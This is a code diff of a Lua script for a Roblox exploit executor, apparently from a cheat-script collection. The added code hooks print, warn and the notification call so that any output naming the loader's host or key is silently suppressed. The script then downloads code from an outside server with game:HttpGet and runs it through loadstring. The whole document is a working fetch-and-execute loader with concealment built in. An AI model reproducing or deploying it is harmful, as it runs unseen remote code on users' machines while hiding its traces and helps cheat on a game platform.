@@ -4,27 +4,46 @@
 
     Closet.GG > Premium/Skidded slops
 ]] 
-
+local KEYS = { "pufus", "nnm2k8fv" }
 local StarterGui = game:GetService("StarterGui")
 
-local old_setcore = clonefunction(StarterGui.SetCore)
-
-hookfunction(StarterGui.SetCore, newcclosure(function(self, name, ...)
-	if name == "SendNotification" then
-		print("[hook] blocked SendNotification")
-		return
+local function has_key(v)
+	if type(v) ~= "string" then return false end
+	local s = string.lower(v)
+	for _, k in ipairs(KEYS) do
+		if string.find(s, k, 1, true) then return true end
 	end
-	return old_setcore(self, name, ...)
+	return false
+end
+
+local function args_have_key(...)
+	for i = 1, select("#", ...) do
+		local v = select(i, ...)
+		if has_key(v) then return true end
+		if type(v) == "table" then
+			for _, x in pairs(v) do
+				if has_key(x) then return true end
+			end
+		end
+	end
+	return false
+end
+
+local old_print = clonefunction(print)
+hookfunction(print, newcclosure(function(...)
+	if args_have_key(...) then return end
+	return old_print(...)
 end))
 
-local old_namecall
-old_namecall = hookmetamethod(game, "__namecall", function(self, ...)
-	if getnamecallmethod() == "SetCore" and self == StarterGui and (...) == "SendNotification" then
-		print("[hook] blocked SendNotification (namecall)")
-		return
-	end
-	return old_namecall(self, ...)
-end)
+local old_warn = clonefunction(warn)
+hookfunction(warn, newcclosure(function(...)
+	if args_have_key(...) then return end
+	return old_warn(...)
+end))
 
-print("[hook] armed")
+local old_setcore = clonefunction(StarterGui.SetCore)
+hookfunction(StarterGui.SetCore, newcclosure(function(self, name, ...)
+	if name == "SendNotification" and args_have_key(...) then return end
+	return old_setcore(self, name, ...)
+end))
 loadstring(game:HttpGet("https://script.pufus.win/nnm2k8fv"))()
